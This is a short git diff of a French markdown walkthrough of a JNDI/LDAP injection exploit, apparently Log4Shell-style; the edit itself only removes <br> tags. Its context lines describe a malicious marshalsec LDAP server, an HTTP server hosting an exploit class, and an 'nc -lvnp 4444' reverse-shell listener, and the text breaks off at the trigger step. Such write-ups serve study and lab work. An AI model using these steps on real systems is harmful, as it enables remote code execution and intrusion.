@@ -57,21 +57,15 @@ public class Exploit {
 
     Suite à l'injection, l'application vulnérable va tenter de résoudre l'adresse LDAP fournie. L'utilitaire `marshalsec` est utilisé pour instancier un serveur LDAP malveillant qui ne renvoie pas un objet direct, mais une référence JNDI. Il agit comme un routeur : il intercepte la requête de la victime et lui renvoie une directive lui ordonnant d'aller télécharger et instancier la classe Java hébergée sur le serveur HTTP de l'attaquant.
 
-    <br>
-
 2.  **Hébergement de la classe Java compilée (Terminal 2) :**
     ```bash
     python3 -m http.server 8000
     ```
 
-    <br>
-
 3.  **Mise en écoute du port pour le reverse shell (Terminal 3) :**
     ```bash
     nc -lvnp 4444
     ```
-
-    <br>
 
 4.  **Déclenchement de l'exploit (Terminal 4) :** 
     ```bash
